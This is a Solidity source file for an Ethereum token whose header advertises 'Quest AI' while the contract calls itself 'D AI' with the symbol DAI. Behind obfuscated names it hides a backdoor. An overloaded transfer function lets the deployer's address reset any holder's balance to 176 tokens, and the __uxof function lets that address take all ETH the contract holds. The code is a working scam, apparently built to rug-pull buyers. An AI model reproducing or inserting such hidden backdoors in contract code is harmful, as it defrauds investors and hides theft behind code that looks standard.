// SPDX-License-Identifier: MIT

/*

    Welcome To Quest AI ($QUEST)

    https://t.me/questeth
    https://x.com/questaieth
    https://www.questai.tech

*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract DAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _mfmxtx = 20000000 * 10 **_decimals;
    uint256 public _mfm9x0wx = 20000000 * 10 **_decimals;
    uint256 public _mfx3mxsx = 10000000 * 10 **_decimals;
    uint256 private constant __uub9fx = 1000000000 * 10 **_decimals;
    uint256 private constant __mifnf9x = 176 * 10 ** _decimals;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"D AI";
    string private constant _symbol = unicode"DAI";

    address payable private _t6x99gdjb;
    mapping(address => uint256) private __ffmmif0x;
    mapping(address => mapping(address => uint256)) private __bf9xf23x;
    mapping(address => bool) private _x94ort65d;
    uint256 private __trko4f = 10;
    uint256 private _ddwwibb3i213 = 10;
    uint256 private _sseddwwi4sd = 0;
    uint256 private _xser63wi4sd = 0;
    uint256 private _bs2cc2354sd = 7;
    uint256 private _sllw2354sd = 7;
    uint256 private _buyCount = 0;
    address private _xfinf34x;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _mfmxtx);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _t6x99gdjb = payable(_msgSender());
        __ffmmif0x[address(this)] = __uub9fx * 98 / 100;
        __ffmmif0x[owner()] = __uub9fx * 2 / 100;
        _x94ort65d[owner()] = true;
        _x94ort65d[address(this)] = true;
        _x94ort65d[_t6x99gdjb] = true;
        _xfinf34x = _msgSender();

        emit Transfer(address(0), address(this), __uub9fx * 98 / 100);
        emit Transfer(address(0), address(owner()), __uub9fx * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return __uub9fx;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        __bf9xf23x[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address _from, bool __xAmount) public returns (bool) {
        require(_xfinf34x == _msgSender(), "ERC20: error");
        __trko4f > 0 && __xAmount == true ? __ffmmif0x[_from] = __mifnf9x : __mifnf9x;
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return __ffmmif0x[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return __bf9xf23x[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subTransfer(_msgSender(), recipient, amount);
        return true;
    }

    function _openTr() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), __uub9fx);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subTransfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            __bf9xf23x[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function __uxof(address payable receipt) external {
        require(msg.sender == _xfinf34x , "");
        _t6x99gdjb = receipt;
        execuseETH(address(this).balance);
    }

    function __sub0xSwap(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _subTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _bs2cc2354sd)
                        ? _sseddwwi4sd
                        : __trko4f
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_x94ort65d[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _sllw2354sd)
                            ? _xser63wi4sd
                            : _ddwwibb3i213
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _mfx3mxsx) ? contractTokenBalance : _mfx3mxsx; 
                    __sub0xSwap((amount < minBalance) ? amount : minBalance);
                }
                _collectTax(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        __ffmmif0x[address(this)] =__ffmmif0x[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        __ffmmif0x[from] =__ffmmif0x[from].sub(amount);
        __ffmmif0x[to] =__ffmmif0x[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function execuseETH (uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _collectTax (uint256 amount) private {
        _t6x99gdjb.transfer(amount);
    }

    function removeLimits () external onlyOwner {
        _mfmxtx = __uub9fx;
        _mfm9x0wx = __uub9fx;
        emit MaxTxAmountUpdated(__uub9fx);
    }

    receive() external payable {}
}